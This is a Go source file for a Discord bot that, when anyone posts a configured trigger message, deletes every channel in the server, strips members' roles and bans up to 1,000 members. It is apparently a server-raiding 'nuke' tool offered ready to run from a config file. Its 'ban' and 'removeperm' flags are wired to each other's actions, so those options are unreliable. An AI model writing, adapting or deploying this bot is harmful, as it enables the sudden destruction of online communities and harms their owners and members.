package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"os/signal"
	"syscall"

	"github.com/bwmarrin/discordgo"
)

var (
	Token          string
	ban            bool
	removeperm     bool
	deletechannels bool
	command        string
)

var Config struct {
	Token          string `json:"token"`
	Ban            bool   `json:"ban"`
	Removeperm     bool   `json:"removeperm"`
	Deletechannels bool   `json:"deletechannels"`
	Command        string `json:"command"`
}

func checkerror(err error, caller string) bool {
	if err == nil {
		return true
	} else {
		println(caller, err.Error())
		return false
	}

}

func execdeletechannels(s *discordgo.Session, g string) {
	a, err := s.GuildChannels(g)
	if checkerror(err, "get channels") {
		length := len(a)
		for i := 0; i < length; i++ {
			println(a[i].ID)
			_, err = s.ChannelDelete(a[i].ID)
			checkerror(err, "delete channels")
		}
	}
}

func deleteusers(s *discordgo.Session, g string) {
	a, err := s.GuildMembers(g, "0", 1000)
	if checkerror(err, "GetUsers") {
		lenght := len(a)
		// Permission Remove and Ban
		for i := 0; i < lenght; i++ {
			var emptyarr []string
			a[i].Roles = emptyarr

			if ban {
				err = s.GuildMemberEdit(g, a[i].User.ID, emptyarr)
				checkerror(err, "RemovePerm")
			}

			if removeperm {
				err = s.GuildBanCreateWithReason(g, a[i].User.ID, "...", 7)
				checkerror(err, "BanMembers")
			}

		}
		println("Delete Users Done")

	}

}

func nuke(s *discordgo.Session, g string) {
	if deletechannels {
		execdeletechannels(s, g)
	}
	if ban || removeperm {
		deleteusers(s, g)
	}

}

func init() {
	jsonFile, err := os.Open("config.json")
	if checkerror(err, "json") {
		byteValue, err := ioutil.ReadAll(jsonFile)
		if checkerror(err, "json 2") {
			err = json.Unmarshal(byteValue, &Config)
			checkerror(err, "json unmarshal")
			Token = Config.Token
			ban = Config.Ban
			removeperm = Config.Removeperm
			command = Config.Command
			deletechannels = Config.Deletechannels
			defer jsonFile.Close()

		}

	}

}

func main() {

	dg, err := discordgo.New("Bot " + Token)
	if err != nil {
		fmt.Println("error creating Discord session,", err)
		return
	}

	dg.AddHandler(messageCreate)

	dg.Identify.Intents = discordgo.IntentsGuildMessages

	err = dg.Open()
	if err != nil {
		fmt.Println("error opening connection,", err)
		return
	}

	fmt.Println("Bot is now running.  Press CTRL-C to exit.")
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc

	dg.Close()
}

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {

	if m.Author.ID == s.State.User.ID {
		return
	}

	if m.Content == command {
		nuke(s, m.GuildID)
	}

}
